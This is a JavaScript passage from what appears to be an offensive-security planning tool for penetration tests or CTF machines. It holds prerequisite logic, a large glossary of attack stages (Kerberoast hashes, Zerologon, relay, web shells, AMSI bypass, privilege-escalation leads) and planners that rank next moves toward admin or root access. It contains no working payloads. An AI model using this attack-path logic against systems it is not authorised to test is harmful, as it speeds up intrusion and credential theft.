        if (fastHave ? fastHave[yk2] : facts.has(yk2)) { any = true; break; }
      }
      if (!any && !credentialProbeAllowed(this, facts)) return false;
    }
    if ((this.id === 'win-interactive-shell' || this.id === 'ad-user-enum') && this.commands && this.commands.length) {
      var self = this;
      if (!this.commands.some(function (c) { return commandIsEligible(c, facts, self); })) return false;
    }
    return true;
  };

  Action.prototype.unmet = function (facts, knownIneligible) {
    if (facts && facts.forAction && (!facts.context || facts.context.actionId !== this.id)) {
      if (facts._resolvedContext && facts._resolvedContext.locus === 'overview' && !actionNeedsForActionContext(this, facts)) {
        // Invariant across per-command contexts; evaluate directly against overview facts.
      } else if (knownIneligible) {
        if (facts._resolvedContext && facts._resolvedContext.locus === 'overview' && !facts.has('winrm.authenticated') && !facts.has('rdp.authenticated')) {
          if (!osCompatible(facts, this.os, this)) {
            var invFamily = hostOsFamily(facts) || 'another OS';
            return 'blocked because target looks like ' + invFamily;
          }
          var invHasFn = null;
          for (var qi = 0; qi < this.requires_all.length; qi++) {
            var qk = this.requires_all[qi];
            if (CONTEXT_SENSITIVE_KIND_RE.test(qk)) break;
            if (!facts.has(qk)) {
              if (qk === 'http.reachable') {
                if (!invHasFn) invHasFn = function (k) { return facts.has(k); };
                if (hasActionReqKind(this, invHasFn, qk)) continue;
              }
              return 'blocked until ' + friendly(qk) + ' exists';
            }
          }
        }
        return this.unmet(facts.forAction(this));
      } else {
        var action = this, candidates = facts.forActionContexts ? facts.forActionContexts(this) : [facts.forAction(this)];
        var eligible = candidates.filter(function (candidate) { return action.eligible(candidate); })[0];
        return this.unmet(eligible || candidates[0]);
      }
    }
    // A friendly one-line reason this action is blocked (first unmet prerequisite).
    if (!osCompatible(facts, this.os, this)) {
      var family = hostOsFamily(facts) || 'another OS';
      return 'blocked because target looks like ' + family;
    }
    var hasFactFn = function (k) { return facts.has(k); };
    for (var i = 0; i < this.requires_all.length; i++) {
      if (!hasActionReqKind(this, hasFactFn, this.requires_all[i])) {
        return 'blocked until ' + friendly(this.requires_all[i]) + ' exists';
      }
    }
    if (this.requires_any.length) {
      var anyMet = false;
      for (var j = 0; j < this.requires_any.length; j++) {
        if (facts.has(this.requires_any[j])) { anyMet = true; break; }
      }
      if (!anyMet && !credentialProbeAllowed(this, facts)) {
        var alts = this.requires_any.map(friendly).join(' or ');
        return 'blocked until ' + alts;
      }
    }
    return 'blocked';
  };

  // ------------------------------------------------ friendly fact-kind phrasing --
  var FRIENDLY = {
    'target.configured': 'a configured target',
    'host.up': 'a live host',
    'host.os_family': 'target OS family', 'host.os_hint': 'target OS hint',
    'host.interface': 'host network interface', 'host.ip_address': 'host IP address',
    'host.route': 'host route', 'host.arp_neighbor': 'host ARP neighbor',
    'host.dns_server': 'host DNS server', 'host.listen_socket': 'host listening socket',
    'host.tools': 'host tool inventory (present LOLBins)', 'host.multihomed': 'multi-homed host',
    'network.subnet_candidate': 'candidate adjacent subnet', 'pivot.candidate': 'pivot candidate',
    'ports.open': 'open ports',
    'scan.nmap.quick': 'a quick nmap open-port scan', 'scan.nmap.version': 'an nmap service/version scan',
    'scan.nmap.udp': 'an nmap UDP scan', 'scan.nmap.vuln': 'an nmap NSE vulnerability scan',
    'scan.local.interfaces': 'local interface enumeration', 'scan.local.routes': 'local route table enumeration',
    'scan.local.neighbors': 'local neighbor cache enumeration', 'scan.local.dns': 'local resolver enumeration',
    'scan.local.listeners': 'local listening-socket enumeration',
    'ad.dc_candidate': 'a domain-controller candidate', 'ad.domain_known': 'the domain',
    'ad.base_dn': 'the LDAP base DN', 'ad.user_list': 'a domain user list',
    'ad.protected_user': 'a Protected Users member (Kerberos-only auth)',
    'ad.anonymous_bind': 'anonymous LDAP bind', 'blocker.smb_null_denied': 'null SMB session rejected (credential needed)', 'blocker.samr_null_denied': 'null-session SAMR user enumeration denied', 'ad.graph.collected': 'the AD graph',
    'ad.attack_paths': 'attack paths', 'ad.control_paths': 'object-control paths',
    'ad.trusts': 'domain trusts', 'ad.computer_added': 'an added computer account',
    'ad.acl_lead': 'an abusable ACL (control lead)',
    'ad.group_list': 'a list of domain groups', 'ad.computer_list': 'a list of domain computers',
    'ad.zerologon': 'a confirmed Zerologon-vulnerable DC (CVE-2020-1472)',
    'ad.coerced_auth': 'a coercible authentication (PetitPotam/PrinterBug/DFSCoerce)',
    'ad.gpo_control': 'write control over a Group Policy Object',
    'ad.gpo_writable': 'a writable Group Policy Object (gpo-abuse sink)',
    'ad.gmsa': 'a discovered Group Managed Service Account',
    'ad.unconstrained': 'a host trusted for unconstrained delegation',
    'ad.group_joined': 'a group membership we granted ourselves',
    'ad.sid_history': 'an injected/abusable SID history entry',
    'hash.asrep': 'an AS-REP hash', 'hash.tgs': 'a Kerberoast hash', 'hash.ntlm': 'NTLM hashes',
    'hash.krbtgt': 'the krbtgt hash', 'hash.tgt': 'a TGT',
    'credential.candidate': 'candidate credentials', 'credential.available': 'a usable credential',
    'credential.validation': 'credential validation evidence',
    'credential.certificate': 'certificate material',
    'credential.ntlm_hash': 'an NT hash', 'credential.plaintext': 'a plaintext password',
    'credential.weak_hash': 'a weak/unsalted password-hashing scheme',
    'kerberos.tickets': 'Kerberos tickets', 'kerberos.reachable': 'Kerberos is reachable',
    'ldap.reachable': 'LDAP is reachable', 'ldap.authenticated': 'authenticated LDAP access',
    'smb.reachable': 'SMB is reachable', 'smb.authenticated': 'authenticated SMB access',
    'smb.null_session': 'SMB null session', 'smb.guest_session': 'SMB guest session',
    'smb.shares': 'SMB shares', 'smb.ms17_010': 'an MS17-010/EternalBlue-vulnerable SMB host (CVE-2017-0144)',
    'winrm.authenticated': 'authenticated WinRM access',
    'winrm.reachable': 'WinRM is reachable', 'rdp.reachable': 'RDP is reachable',
    'host.rdp_enabled': 'RDP remote desktop access enabled (port 3389)',
    'host.winrm_enabled': 'WinRM remote management access enabled (port 5985)',
    'rdp.authenticated': 'authenticated RDP access', 'ssh.reachable': 'SSH is reachable',
    'ssh.authenticated': 'authenticated SSH access', 'ssh.banner': 'an SSH banner',
    'ssh.hostkey': 'SSH host keys', 'ftp.reachable': 'FTP is reachable',
    'ftp.authenticated': 'authenticated FTP access', 'ftp.banner': 'an FTP banner',
    'ftp.anonymous_login': 'anonymous FTP login', 'snmp.reachable': 'SNMP is reachable',
    'snmp.community': 'an SNMP community', 'snmp.info': 'SNMP system info',
    'dns.reachable': 'DNS is reachable', 'http.response': 'an HTTP response',
    'http.redirect': 'an HTTP redirect',
    'access.admin': 'administrative access', 'access.system': 'SYSTEM access',
    'access.desktop': 'an interactive desktop', 'foothold.windows': 'a Windows foothold',
    'access.shell': 'an interactive shell', 'foothold.linux': 'a Linux foothold',
    'loot.ntds': 'NTDS secrets', 'adcs.vulnerable': 'a vulnerable ADCS template',
    'persistence.domain': 'domain persistence', 'enum.deep': 'deep enumeration',
    'vuln.candidates': 'vulnerability candidates', 'relay.success': 'a successful relay',
    'config.review': 'config review', 'lateral.movement': 'lateral movement',
    'host.kernel': 'host kernel/version', 'host.arch': 'host architecture',
    'host.firewall': 'host firewall rules (egress/pivot intel)',
    'hash.type': 'an identified hash type + cracking mode',
    'hash.mscache': 'a cached domain-logon hash (MSCache2/DCC2)',
    'defense.control': 'an endpoint defensive control (AMSI/AppLocker/CLM)',
    'privesc.leads': 'local privilege escalation leads',
    'privesc.sudo_rights': 'sudo rights lead',
    'privesc.sudo_binary': 'a sudo-allowed binary with a GTFOBins escalation',
    'privesc.suid_candidate': 'SUID/SGID candidate', 'privesc.capability': 'dangerous Linux capability',
    'privesc.cron_writable': 'writable scheduled task or cron lead',
    'privesc.scheduled_task': 'a privileged scheduled-task privesc lead',
    'privesc.process_lead': 'process-monitoring privesc lead',
    'privesc.passwd_writable': 'writable /etc/passwd lead',
    'privesc.nfs_no_root_squash': 'NFS no_root_squash lead',
    'privesc.lxd_group': 'LXD group escape lead', 'privesc.docker_group': 'Docker socket/group escape lead',
    'privesc.windows_privilege': 'dangerous Windows privilege',
    'privesc.always_install_elevated': 'AlwaysInstallElevated lead',
    'privesc.unquoted_service_path': 'unquoted service path lead',
    'privesc.weak_service_permission': 'weak service permission lead',
    'privesc.stored_credentials': 'stored Windows credential lead',
    'privesc.patch_gap': 'missing-patch privesc lead',
    'privesc.kernel_exploit': 'a suggested kernel/local exploit (linPEAS/LES)',
    'privesc.dll_hijack_candidate': 'DLL search-order hijack lead',
    'privesc.service_bof_candidate': 'custom-service buffer-overflow lead',
    'persistence.linux': 'Linux persistence', 'persistence.windows': 'Windows persistence',
    'http.reachable': 'HTTP is reachable',
    'web.content_map': 'a map of discovered web content', 'web.vhost': 'a discovered virtual host',
    'web.title': 'a web page title', 'web.server': 'a web server header',
    'web.tech': 'web technology fingerprints', 'web.source': 'exposed application source',
    'web.parameterized': 'a parameterized web endpoint', 'web.authenticated': 'authenticated web access',
    'web.upload_form': 'a file-upload form', 'web.upload_confirmed': 'a confirmed file upload',
    'web.lfi_confirmed': 'a confirmed local file inclusion', 'web.sqli_confirmed': 'a confirmed SQL injection',
    'web.cmdi_confirmed': 'a confirmed command injection', 'web.ssrf_confirmed': 'a confirmed SSRF',
    'web.users': 'enumerated application users', 'web.nosqli_confirmed': 'a confirmed NoSQL injection',
    'web.jwt_secret': 'a recovered JWT signing secret', 'web.authz_bypass': 'a web authorization bypass',
    'foothold.webshell': 'a web shell', 'db.databases': 'database names', 'db.tables': 'database tables',
    'db.creds': 'database credential material', 'loot.files': 'recovered files',
    'loot.material': 'harvested credential material', 'loot.metadata': 'recovered file metadata',
    'loot.embedded': 'embedded/stego content', 'loot.git_secret': 'secret in git history',
    'loot.deleted_files': 'recoverable deleted files', 'web.actuator': 'exposed Spring Boot actuator',
    'policy.lockout': 'account-lockout policy', 'credreuse.tried': 'credential-reuse attempt',
    'cloud.aws_access': 'AWS cloud access', 'exploit.candidate': 'a candidate exploit',
    'objective.flag': 'a captured flag', 'objective.local_flag': 'a captured local flag',
    'objective.root_flag': 'a captured root/proof flag', 'objective.swept': 'a completed post-Domain-Admin flag sweep',
    'objective.flag_located': 'a located flag',
    'phish.prepared': 'a prepared client-side (library-ms/WebDAV) attack',
    'host.domain': "the host's AD domain", 'host.fqdn': "the host's fully-qualified name",
    'host.hostname': "the host's computer name", 'smb.signing': 'SMB signing posture',
    'http.body': 'an HTTP response body', 'http.headers': 'HTTP response headers',
    'http.methods': 'enabled HTTP methods', 'http.cors': 'a permissive CORS policy',
    'http.exposed': 'an exposed HTTP path or file', 'tls.info': 'TLS certificate/protocol info',
    'dns.email': 'email DNS records (SPF/DMARC/DKIM)', 'dns.takeover': 'a dangling DNS takeover candidate',
    'dns.zone': 'DNS records / a permitted zone transfer', 'hash.ike_psk': 'an IKE aggressive-mode PSK hash (crackable)',
    'web.idor_candidate': 'a candidate IDOR', 'web.xss_confirmed': 'a confirmed cross-site scripting',
    'web.ssti_confirmed': 'a confirmed server-side template injection',
    'access.command_exec': 'command execution on the target',
    'credential.netntlm': 'a captured NetNTLM hash',
    'loot.shadow': 'captured /etc/shadow hashes', 'db.session': 'an interactive database session',
    'listener.open': 'a live reverse-shell listener', 'tunnel.socks': 'a live SOCKS pivot',
    'tunnel.route': 'an established pivot route',
    'wifi.adapter_present': 'a wireless adapter', 'wifi.driver_loaded': 'a loaded Wi-Fi driver',
    'wifi.adapter_monitor_capable': 'a monitor/injection-capable adapter',
    'wifi.monitor_mode': 'monitor mode enabled', 'wifi.injection_capable': 'packet-injection capability',
    'wifi.ap_discovered': 'a discovered access point', 'wifi.client_seen': 'an observed wireless client',
    'wifi.handshake_captured': 'a captured WPA handshake', 'wifi.pmkid_captured': 'a captured PMKID',
    'wifi.psk_cracked': 'a cracked Wi-Fi PSK', 'wifi.associated': 'an associated (on-network) wireless link',
    'wifi.eap_creds': 'captured WPA-Enterprise EAP credentials',
    'sccm.enumerated': 'SCCM/MECM enumeration outcome (present/absent)',
    'mssql.reachable': 'MSSQL is reachable', 'mssql.authenticated': 'an authenticated MSSQL session',
    'access.root': 'root access', 'privesc.script_sink': 'an injectable sink in a sudo-allowed script',
    'host.notable_program': 'a bespoke local program worth investigating (a run-this-and-read-it lead)',
    'host.tool_staged': 'a tool or file staged onto the target host (a confirmed transfer landed)',
    'dns.a_record': 'a forward DNS A record',
    'host.program_inspected': 'a notable local program OBOL has already inspected',
    'lead.stalled': 'a promising move that didn\'t land for a technical reason (worth another look)',
    'ad.domain_control': 'a DACL control right over the domain root',
    'web.exposed_artifact': 'an exposed credential-bearing artifact (db/git/archive/config) to fetch and read',
    'web.artifact_looted': 'an exposed artifact OBOL has already fetched and read',
    'web.param_candidate': 'a discovered request parameter', 'web.params_discovered': 'parameter fuzzing completed for an endpoint',
    'web.param_probed': 'an injection probe tried against a parameter', 'web.injectable_param': 'a confirmed injectable parameter',
    'web.param_exploited': 'an injectable parameter handed off for exploitation',
    // service reachability leads (consumed by the service-to-foothold conversions)
    'nfs.reachable': 'a reachable NFS export', 'rsync.reachable': 'a reachable rsync module',
    'telnet.reachable': 'a reachable Telnet login', 'rservices.reachable': 'reachable Berkeley r-services',
    'tftp.reachable': 'a reachable TFTP service', 'x11.reachable': 'an open X11 display',
    'cloud.credential': 'a cloud credential', 'privesc.cron': 'a writable or hijackable cron job',
    'ssh.key_rejected': 'an SSH key the server refuses',
    // operational blockers (diagnostic walls a pasted error reveals - each surfaces its fix doctor)
    'blocker.host_down': 'a host-unreachable result from a ping-gated scan',
    'blocker.name_resolution': 'a name-resolution failure', 'blocker.clock_skew': 'a Kerberos clock-skew error',
    'blocker.crlf': 'a CRLF / bad-interpreter error', 'blocker.no_tty': 'a no-TTY / no-terminal error',
    'blocker.amsi': 'an AMSI block', 'blocker.potato': 'a potato / SeImpersonate failure',
    'blocker.rate_limited': 'a rate-limit / WAF throttle', 'blocker.tls_scheme': 'a TLS / scheme mismatch',
    'blocker.hash_format': 'a hash-format / cracking-mode error', 'blocker.hashcat_env': 'a hashcat environment error',
    'blocker.egress_blocked': 'an egress-blocked callback', 'blocker.smb_signing': 'an SMB-signing-required relay target',
    'blocker.kerberos_spn': 'a Kerberos SPN error', 'blocker.responder_quiet': 'a quiet Responder (no hashes captured)',
    'blocker.web_wildcard': 'a wildcard / catch-all web response', 'blocker.ntlm_disabled': 'an NTLM-disabled login',
    'blocker.password_change': 'a password-change-required login', 'blocker.lockout': 'an account lockout',
    'blocker.account_restricted': 'a restricted account',
    'blocker.acl_reauth': 'an access-denied on an ACL write (re-authenticate after the grant)',
    // known-exploit fingerprints (each gates its matching exploit module)
    'vuln.vsftpd_234': 'the vsftpd 2.3.4 backdoor fingerprint', 'vuln.proftpd_modcopy': 'the ProFTPD mod_copy fingerprint',
    'vuln.samba_usermap': 'the Samba usermap_script fingerprint', 'vuln.smbghost': 'the SMBGhost fingerprint',
    'vuln.bluekeep': 'the BlueKeep fingerprint', 'vuln.shellshock': 'the Shellshock fingerprint',
    'vuln.heartbleed': 'the Heartbleed fingerprint', 'vuln.drupalgeddon2': 'the Drupalgeddon2 fingerprint',
    'vuln.phpmyadmin_lfi': 'the phpMyAdmin LFI fingerprint', 'vuln.webmin': 'the Webmin RCE fingerprint',
    'vuln.usermin': 'the Usermin RCE fingerprint', 'vuln.ofbiz': 'the Apache OFBiz fingerprint',
    'vuln.cacti': 'the Cacti fingerprint', 'vuln.zabbix': 'the Zabbix fingerprint',
    'vuln.splunk': 'the Splunk RCE fingerprint', 'vuln.text4shell': 'the Text4Shell fingerprint',
    'vuln.freeswitch': 'the FreeSWITCH fingerprint', 'vuln.jdwp': 'an open JDWP debug port',
    'vuln.aerospike': 'the Aerospike UDF fingerprint', 'vuln.wifi_mouse': 'the WiFi Mouse Server fingerprint',
    'vuln.jenkins': 'the Jenkins RCE fingerprint', 'vuln.nosqli': 'a NoSQL-injection fingerprint',
    'vuln.dirtycow': 'a DirtyCow-vulnerable Linux kernel (< 4.8.3)',
    'vuln.dirtypipe': 'a DirtyPipe-vulnerable Linux kernel (5.8 - 5.16.10)',
    'vuln.baron_samedit': 'a Baron Samedit-vulnerable sudo version (CVE-2021-3156)',
    'vuln.polkit': 'a PwnKit-vulnerable pkexec version (CVE-2021-4034)',
    'ad.nopac': 'a noPac-vulnerable DC (CVE-2021-42278/42287)',
    'vuln.printnightmare': 'a PrintNightmare-vulnerable Spooler (CVE-2021-34527)',
    'ad.maq_allow': 'a non-zero MachineAccountQuota (>= 1)',
    'mssql.sysadmin': 'MSSQL sysadmin privilege or impersonation path',
    'hash.sntp': 'an MS-SNTP Timeroast machine hash',
    'loot.keepass_dump': 'a discovered KeePass database (.kdbx) or master key dump',
    'smb.readable_share': 'a readable SMB share',
    'smb.content_accessible': 'accessible SMB share contents',
    'smb.writable_share': 'a writable SMB share',
    'share.users_readable': 'a readable Users share',
    'credential.validated': 'a validated credential',
    'ad.delegation': 'a Kerberos delegation configuration',
    'ad.rbcd': 'resource-based constrained delegation (RBCD)',
    'ad.laps': 'a LAPS local administrator password',
    'ad.laps_lead': 'a LAPS deployment lead',
    'hash.candidate': 'a candidate password hash',
    'vuln.h2_console': 'an exposed H2 Database web console',
    'vuln.oracle_tns': 'an Oracle TNS listener vulnerability',
    'vuln.aerospike_udf': 'the Aerospike Lua UDF RCE fingerprint',
    'vuln.chkrootkit': 'a vulnerable chkrootkit cron job (< 0.50)',
    'vuln.screen_suid': 'a SUID GNU Screen 4.5.0 binary',
    'vuln.nvms1000': 'the NVMS-1000 directory traversal fingerprint',
    'vuln.rejetto_hfs': 'the Rejetto HFS RCE fingerprint',
    'vuln.coldfusion': 'an Adobe ColdFusion LFI/RCE fingerprint',
    'vuln.gitea': 'a Gitea RCE or exposed repository fingerprint',
    'vuln.myfaces_jsf': 'an Apache MyFaces JSF ViewState deserialization lead',
    'vuln.node_serialize': 'a Node.js node-serialize RCE cookie',
    'vuln.usermin_rce': 'the Usermin RCE fingerprint',
    'vuln.zabbix_agent': 'an exec-enabled Zabbix agent',
    'vuln.prtg': 'a PRTG Network Monitor RCE lead',
    'privesc.cron_wildcard': 'a root cron job using an unquoted wildcard (*)',
    'privesc.group_lxd': 'LXD/LXC group membership',
    'privesc.container_group': 'privileged container group membership (docker/lxd)',
    'privesc.sudo': 'an abusable sudo privilege',
    'pivot.active': 'an active network pivot tunnel',
    'tunnel.dns': 'an active DNS covert tunnel',
    'ftp.anon_write': 'anonymous writable FTP access',
    'file.nsclient_ini': 'an exposed NSClient++ nsclient.ini config',
    'web.fingerprint.jenkins': 'a detected Jenkins server',
    'web.fingerprint.nvms': 'a detected TVT NVMS-1000 web server',
    'blocker.certutil_usage': 'a certutil download syntax or AV block',
    'advice.kerberos': 'Kerberos troubleshooting guidance',
    'advice.relay': 'NTLM relay target guidance',
    'advice.responder': 'Responder tuning guidance',
    'advice.reauth': 'fresh-session re-authentication guidance',
    'advice.password': 'password-change recovery guidance',
    'advice.account': 'restricted-account bypass guidance',
    'advice.hash': 'hash-format and mode guidance',
    'advice.hosts': '/etc/hosts resolution guidance',
    'advice.egress': 'egress-filtering bypass guidance',
    'advice.certutil': 'clean Windows file-transfer guidance',
    'advice.tty': 'interactive PTY upgrade guidance',
    'advice.exec': 'binary execution recovery guidance',
    'advice.amsi': 'AMSI bypass guidance',
    'advice.ssh': 'SSH key authentication guidance',
    'advice.web_access': 'web virtual-host and access guidance',
    'advice.potato': 'SeImpersonate Potato selection guidance',
    'exploit.hazard_version_gate': 'a strict version-banner gate in a public exploit',
    'exploit.hazard_py3_syntax': 'Python 3-only syntax in an exploit script',
    'exploit.hazard_java_target': 'a Java bytecode target-version hazard in an exploit',
    'privesc.custom_binary': 'a non-package privileged custom binary',
    'privesc.path_hijack_candidate': 'a relative-command PATH hijack lead',
    'privesc.library_or_script_hijack': 'a writable library or script hijack lead',
  };

  function friendly(kind) {
    if (FRIENDLY[kind]) return FRIENDLY[kind];
    if (kind.indexOf('port:') === 0) return 'port ' + kind.split(':')[1] + ' open';
    if (kind.indexOf('service.') === 0) return kind.split('.')[1] + ' service evidence';
    if (kind.indexOf('advice.') === 0) return kind.split('.').slice(1).join(' ').replace(/_/g, ' ') + ' guidance';
    if (kind.indexOf('vuln.') === 0) return 'a ' + kind.split('.').slice(1).join(' ').replace(/_/g, ' ') + ' vulnerability lead';
    if (kind.indexOf('blocker.') === 0) return 'a ' + kind.split('.').slice(1).join(' ').replace(/_/g, ' ') + ' blocker';
    if (kind.indexOf('.') > 0) return kind.replace(/\./g, ' ').replace(/_/g, ' ');
    return kind;
  }
  // A SHORT Title-Case label for a fact chip ("Needs: Usable Credential"): the friendly phrase with a
  // leading article dropped and each significant word capitalised. Short connectors stay lowercase.
  var CHIP_SMALL = { a: 1, an: 1, the: 1, of: 1, or: 1, to: 1, 'in': 1, on: 1, and: 1, 'for': 1 };
  function chipLabel(kind) {
    var s = friendly(kind).replace(/^(a|an|the)\s+/i, '');
    return s.split(/\s+/).map(function (w, i) {
      if (i > 0 && CHIP_SMALL[w.toLowerCase()]) return w.toLowerCase();
      // keep already-capitalised / acronym tokens (SMB, ADCS, NTDS, SYSTEM) as-is
      if (/[A-Z]/.test(w.slice(1)) || w === w.toUpperCase()) return w;
      return w.charAt(0).toUpperCase() + w.slice(1);
    }).join(' ');
  }

  // ---- "Opens Up Next": the aspirational roadmap of locked moves ----------------------------------
  // Only CAPABILITY-unlocks belong here - moves you work TOWARD (a credential, a shell, admin, a user
  // list, a reachable service). Contingency moves (the blocker.* trap doctors, the vuln.* fingerprint
  // exploits) are not a roadmap - you don't pursue "my clock is skewed" - so they are excluded; they
  // surface reactively elsewhere. Report-only writeup checks are excluded too. The rest sort by how CLOSE
  // they are to unlocking (fewest unmet prerequisites first), each carrying the fact-chips it still needs.
  function isContingencyMove(a) {
    var prod = a.produces || [];
    if (prod.length && prod.every(function (k) { return /^advice\./.test(k); })) return true; // a guidance doctor
    var gates = (a.requires_all || []).concat(a.requires_any || []);
    if (gates.length && gates.every(function (k) { return /^(blocker|vuln)\./.test(k); })) return true;
    return false;
  }
  function opensUpNext(facts, pack, opts) {
    opts = opts || {};
    var locked = lockedActions(facts, pack); // already OS-compatible
    var out = [];
    locked.forEach(function (p) {
      var a = p.action;
      if (isContingencyMove(a)) return;
      if (isReportOnly(a, pack)) return;
      // the unmet prerequisites, as fact kinds: every missing requires_all, plus the requires_any group
      // (shown as one "any of" need) when none of its alternatives is held.
      var needs = [], steps = 0;
      (a.requires_all || []).forEach(function (k) { if (!facts.has(k)) { needs.push(k); steps++; } });
      var anyGroup = (a.requires_any || []);
      if (anyGroup.length) {
        var met = false; for (var i = 0; i < anyGroup.length; i++) if (facts.has(anyGroup[i])) { met = true; break; }
        if (!met) { anyGroup.forEach(function (k) { if (needs.indexOf(k) < 0) needs.push(k); }); steps++; }
      }
      // skip a move that needs a contingency fact to unlock (it isn't something you aspire toward)
      if (needs.some(function (k) { return /^(blocker|vuln)\./.test(k); })) return;
      out.push({ action: a, needs: needs, steps: Math.max(1, steps) });
    });
    out.sort(function (x, y) {
      if (x.steps !== y.steps) return x.steps - y.steps;          // closest to unlocking first
      if (y.action.priority !== x.action.priority) return y.action.priority - x.action.priority;
      return x.action.id < y.action.id ? -1 : 1;
    });
    return out;
  }

  // -------------------------------------------------------------- OS helpers --
  function normalizeOsName(value) {
    var text = String(value || '').trim().toLowerCase();
    if (text === 'windows' || text === 'win') return 'windows';
    if (text === 'linux' || text === 'unix' || text === 'gnu/linux') return 'linux';
    return '';
  }

  function hostOsFamily(facts) {
    var families = {};
    facts.values('host.os_family').forEach(function (v) {
      var fam = normalizeOsName(v.family || '');
      if (fam) families[fam] = true;
    });
    var keys = Object.keys(families);
    if (!keys.length) {
      if (facts.has('foothold.windows') || facts.has('winrm.authenticated') || facts.has('rdp.authenticated') || facts.has('os.windows') || facts.has('ad.dc_candidate')) families.windows = true;
      if (facts.has('foothold.linux') || facts.has('os.linux')) families.linux = true;
      keys = Object.keys(families);
    }
    if (!keys.length) {
      facts.values('host.os_hint').forEach(function (v) {
        var fam = normalizeOsName(v.family || '');
        if (fam) families[fam] = true;
      });
      keys = Object.keys(families);
    }
    return keys.length === 1 ? keys[0] : '';
  }

  function osCompatibleWithFamily(facts, family, actionOs, action) {
    var allowed = {};
    (actionOs || []).forEach(function (item) { var n = normalizeOsName(item); if (n) allowed[n] = true; });
    var keys = Object.keys(allowed);
    if (family === 'linux' && action && (action.pack_id === 'ad_2026_09' || action.pack_id === 'obol_ad_2026_09') && !/^nmap-(?:fast-open-ports|version-scripts|vuln-scripts|udp-top)$/.test(action.id)) {
      var hasAdSmb = facts.has('smb.reachable') || facts.has('ldap.reachable') || facts.has('kerberos.reachable') || facts.has('winrm.reachable') || facts.has('ad.dc_candidate');
      if (!hasAdSmb) return false;
    }
    if (!keys.length) return true;
    if (!family) return true;
    return !!allowed[family];
  }

  function osCompatible(facts, actionOs, action) {
    return osCompatibleWithFamily(facts, hostOsFamily(facts), actionOs, action);
  }

  // ------------------------------------------------------------ pack loading --
  // In the browser, packs are provided as already-parsed JSON (fetched by the loader),
  // so loadPacks concatenates + dedupes by action id (first definition wins).
  function actionsFromPackData(packData) {
    var pid = (packData && (packData.id || packData.name)) || '';
    return (packData.actions || []).map(function (a) {
      var act = new Action(a);
      if (pid && !act.pack_id) act.pack_id = pid;
      return act;
    });
  }

  function loadPacks(packDataList) {
    var seen = {}, out = [];
    (packDataList || []).forEach(function (packData) {
      actionsFromPackData(packData).forEach(function (action) {
        if (seen[action.id]) return;
        seen[action.id] = true;
        out.push(action);
      });
    });
    return out;
  }

  var FLAG_HUNT_IDS = {
    'flag-hunt-linux': 1,
    'flag-hunt-root-linux': 1,
    'flag-hunt-windows': 1,
    'flag-hunt-root-windows': 1,
  };
  function isFlagHuntAction(a) {
    if (!a) return false;
    if (FLAG_HUNT_IDS[a.id] || a.pack_id === 'obol_flag_hunt_2026_09') return true;
    var prod = a.produces || [];
    return prod.length > 0 && prod.every(function (k) { return OBJECTIVE_FLAG_RE.test(k); });
  }

  // ------------------------------------------------------------------ planner --
  // The live actions, ranked by the engagement phase/flow model. Bucketed by how far
  // ahead of the target's frontier they reach (0 = on-flow), then by pack priority.
  function nextActions(facts, pack, opts) {
    opts = opts || {};
    var doneIds = opts.doneIds || {};
    var focus = opts.focusPrefixes || [];
    var noFlags = !!(opts.noFlags || opts.flagsEnabled === false);
    var live = pack.filter(function (a) {
      if (noFlags && isFlagHuntAction(a)) return false;
      return a.eligible(facts) && !a.settled(facts) && !a.obsolete(facts) && !doneIds[a.id];
    });
    var frontier = P.frontierIndex(facts);

    function onType(a) {
      if (!focus.length) return 0;
      for (var i = 0; i < a.produces.length; i++) {
        for (var j = 0; j < focus.length; j++) {
          if (String(a.produces[i]).indexOf(focus[j]) === 0) return -1;
        }
      }
      return 0;
    }

    // The machine-type focus is a NUDGE, not an override: it adds a modest bonus so a matching move edges
    // ahead of a comparable one, but it must never bury a much higher-priority move - e.g. the priority-99
    // domain-compromise cash-in (produces access.admin) must not sit below a priority-40 AD enum just because
    // a "DC" focus matches ad.* but not access.*. Rank within a phase bucket by effective priority + focus
    // bonus (effective priority applies the deprioritize-when penalty for side-quest moves).
    var FOCUS_BONUS = 8;
    function score(a) { return a.effectivePriority(facts) + (onType(a) === -1 ? FOCUS_BONUS : 0); }
    return live.slice().sort(function (a, b) {
      var pa = Math.max(0, P.phaseIndex(P.phaseOfAction(a)) - frontier);
      var pb = Math.max(0, P.phaseIndex(P.phaseOfAction(b)) - frontier);
      if (pa !== pb) return pa - pb;
      return score(b) - score(a);
    });
  }

  // The OS-compatible actions that are NOT yet eligible, each with its unmet-requirement
  // reason. Ordered by phase then priority like the live frontier.
  function lockedActions(facts, pack, opts) {
    opts = opts || {};
    var noFlags = !!(opts.noFlags || opts.flagsEnabled === false);
    var frontier = P.frontierIndex(facts);
    var rMemo = getResolvedFactsMemo(facts);
    var fam = rMemo ? rMemo.fam : hostOsFamily(facts);
    var haveObj = rMemo ? rMemo.have : ((facts && typeof facts.kinds === 'function') ? facts.kinds() : null);
    var tmp = [];
    for (var i = 0; i < pack.length; i++) {
      var a = pack[i];
      if (noFlags && isFlagHuntAction(a)) continue;
      if (!osCompatibleWithFamily(facts, fam, a.os, a)) continue;
      if (a.eligible(facts, haveObj, fam) || a.settled(facts, haveObj) || a.obsolete(facts, haveObj)) continue;
      var px = Math.max(0, P.phaseIndex(P.phaseOfAction(a)) - frontier);
      tmp.push({ item: { action: a, reason: a.unmet(facts, true) }, px: px, pri: a.priority });
    }
    tmp.sort(function (x, y) {
      if (x.px !== y.px) return x.px - y.px;
      return y.pri - x.pri;
    });
    var out = new Array(tmp.length);
    for (var j = 0; j < tmp.length; j++) out[j] = tmp[j].item;
    return out;
  }

  function blockedActions(facts, pack, opts) {
    opts = opts || {};
    var noFlags = !!(opts.noFlags || opts.flagsEnabled === false);
    var blocked = pack.filter(function (a) {
      if (noFlags && isFlagHuntAction(a)) return false;
      return !a.eligible(facts) && !a.settled(facts) && !a.obsolete(facts);
    });
    return blocked.slice().sort(function (a, b) { return b.priority - a.priority; });
  }

  // ---------------------------------------------------- goal-directed planner (v2) --
  // Ranks unlocked actions by the operator's PROVEN frontier first, goal-direction as the
  // tie-breaker. Primary signal is recency: the move your latest evidence just unlocked is almost
  // always the right next step ("I just got X, so now I can do Y"). Goal distance only orders
  // among genuinely-indicated moves and sinks pure side-quests; speculative "try-if-vulnerable"
  // moves (exploit checks, coercion/relay) are capped unless their own indicator fact is present,
  // so they never bury the evidenced next step. Pure function of facts (+ fact timestamps).
  var V2_INF = 1e6;
  var V2_GOALS = ['objective.flag', 'objective.local_flag', 'objective.root_flag', 'access.admin', 'access.system', 'access.root', 'loot.ntds'];
